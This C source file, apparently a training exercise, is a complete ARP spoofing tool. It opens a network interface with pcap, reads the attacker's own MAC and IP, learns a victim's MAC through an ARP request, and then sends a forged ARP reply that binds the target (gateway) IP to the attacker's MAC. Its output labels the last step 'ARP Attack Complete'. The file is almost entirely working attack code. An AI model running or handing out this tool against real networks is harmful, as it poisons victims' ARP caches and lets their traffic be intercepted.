#include <stdio.h>
#include <pcap.h> 
#include <stdint.h>
#include <libnet/include/libnet.h>
//#include <string.h>
//#include <sys/socket.h>
//#include <sys/ioctl.h>
//#include <net/if.h>
#include <netinet/ether.h> //ether_ntoa()
//#include <net/ethernet.h>
//#include <netinet/ip.h>
//#include <netinet/in.h>
//#include <arpa/inet.h>

#define IP_ADDR_LEN 4
#define BROADCAST_ADDR "\xff\xff\xff\xff\xff\xff"
#define NULL_ADDR "\x00\x00\x00\x00\x00\x00"

struct arp_structure {
  struct libnet_ethernet_hdr eth_hdr;
  struct libnet_arp_hdr arp_hdr;
  uint8_t sender_hw_addr[ETHER_ADDR_LEN];
  uint8_t sender_ip_addr[IP_ADDR_LEN];
  uint8_t target_hw_addr[ETHER_ADDR_LEN];
  uint8_t target_ip_addr[IP_ADDR_LEN];
};


void make_arp(uint8_t *packet, uint8_t *src_mac, uint8_t *dst_mac, uint8_t *src_ip, uint8_t *dst_ip, uint16_t opcode) {
 
 struct arp_structure *arp = (struct arp_structure *) malloc(sizeof(struct arp_structure));

  arp->eth_hdr.ether_type = htons(ETHERTYPE_ARP);
  arp->arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
  arp->arp_hdr.ar_pro = htons(ETHERTYPE_IP);
  arp->arp_hdr.ar_hln = ETHER_ADDR_LEN;
  arp->arp_hdr.ar_pln = IP_ADDR_LEN;
  arp->arp_hdr.ar_op = htons(opcode);

  if(dst_mac == NULL) memcpy(arp->eth_hdr.ether_dhost, BROADCAST_ADDR, ETHER_ADDR_LEN);
  else memcpy(arp->eth_hdr.ether_dhost, dst_mac, ETHER_ADDR_LEN);

  memcpy(arp->eth_hdr.ether_shost, src_mac, ETHER_ADDR_LEN);

  if(dst_mac == NULL) memcpy(arp->target_hw_addr, NULL_ADDR , ETHER_ADDR_LEN);
  else memcpy(arp->target_hw_addr, dst_mac, ETHER_ADDR_LEN);

  memcpy(arp->sender_hw_addr, src_mac, ETHER_ADDR_LEN);
  memcpy(&arp->sender_ip_addr, src_ip, IP_ADDR_LEN);
  memcpy(&arp->target_ip_addr, dst_ip, IP_ADDR_LEN);

  memcpy(packet, arp, sizeof(struct arp_structure));
  
  free(arp);

}

void usage() {
  printf("syntax: sudo ./send_arp <interface> <send ip> <target ip>\n");
  printf("sample: sudo ./send_arp ens33 192.168.33.254 192.168.33.2\n");
}
                        
void dump(const u_char* p, int len) {
  if(len<=0) {
    printf("None\n");
    return;
  }
  for(int i =0; i < len; i++) {
    printf("%02x " , *p);
    p++;
    if((i & 0x0f) == 0x0f)
      printf("\n");
  }
  printf("\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  uint8_t sender_mac[ETHER_ADDR_LEN];
  struct in_addr sender_ip;	
  uint8_t target_mac[ETHER_ADDR_LEN];
  struct in_addr target_ip;	
  uint8_t attacker_mac[ETHER_ADDR_LEN];
  struct in_addr attacker_ip;

  /* For static_cast Different Types of Pointers  */
  void *v_sender_ip = &sender_ip.s_addr;
  void *v_target_ip = &target_ip.s_addr; 
  void *v_attacker_ip = &attacker_ip.s_addr;

  uint8_t *packet_s = (uint8_t *) malloc(sizeof(struct arp_structure));
  const uint8_t *packet_r;
  struct arp_structure *arp ;

  int sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock < 0) { perror("socket"); return -1;}
  
  struct ifreq ifr;
  struct pcap_pkthdr *header;		
  pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  
  inet_pton(AF_INET, argv[2], &sender_ip);
  inet_pton(AF_INET, argv[3], &target_ip);
  strncpy(ifr.ifr_name, dev, strlen(dev)+1); // copy until '\0' in string 

  printf("GET Attacker's MAC & IP Address.\n");
  if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) 
    {perror("ioctl"); return -1;} 
  memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
  if(ioctl(sock, SIOCGIFADDR,  &ifr) < 0)
    {perror("ioctl"); return -1;}
  attacker_ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;

  printf("[Attacker MAC]: %s\n", ether_ntoa((struct ether_addr *)attacker_mac));
  printf("[Attacker IP]: %s\n\n", inet_ntoa(attacker_ip));
 
  make_arp(packet_s, attacker_mac, NULL, static_cast<uint8_t *> (v_attacker_ip), static_cast<uint8_t *> (v_sender_ip), ARPOP_REQUEST);
  
  printf("Send ARP Request: Attacker -> Sender\n");  

  printf("---Dump Request Packet---\n");
  dump(packet_s, sizeof(struct arp_structure));
  
  printf("\n");

  if(pcap_sendpacket(handle, packet_s, sizeof(struct arp_structure)) != 0)
    {perror("pcap_sendpacket"); return -1;}
 
  while(1) {
    pcap_next_ex(handle, &header, &packet_r);
    arp = (struct arp_structure *) packet_r; 
    if(ntohs(arp->eth_hdr.ether_type) != ETHERTYPE_ARP) continue;
    if(ntohs(arp->arp_hdr.ar_pro) != ETHERTYPE_IP) continue;
    if(ntohs(arp->arp_hdr.ar_op) != ARPOP_REPLY) continue;
    if(memcmp(arp->sender_ip_addr, &sender_ip, IP_ADDR_LEN) != 0) continue;
    memcpy(sender_mac, arp->sender_hw_addr, ETHER_ADDR_LEN);
    printf("Receive ARP Reply: Sender -> Attacker\n");
    break;
  } // receive ARP reply

  printf("[Sender MAC]: %s\n\n", ether_ntoa((struct ether_addr *)sender_mac));
  make_arp(packet_s, attacker_mac, sender_mac, static_cast<uint8_t *> (v_target_ip), static_cast<uint8_t *> (v_sender_ip), ARPOP_REPLY);
  
  printf("Send ARP Reply Attack: Attacker -> Sender\n"); 
  printf("---Dump Attack Packet---\n");
  dump(packet_s,sizeof(struct arp_structure));
  printf("\n");

  if(pcap_sendpacket(handle, packet_s, sizeof(struct arp_structure)) != 0)
    {perror("pcap_sendpacket"); return -1;}
  else printf("ARP Attack Complete.\n");
  
  free(packet_s);
  pcap_close(handle);
  return 0;
}

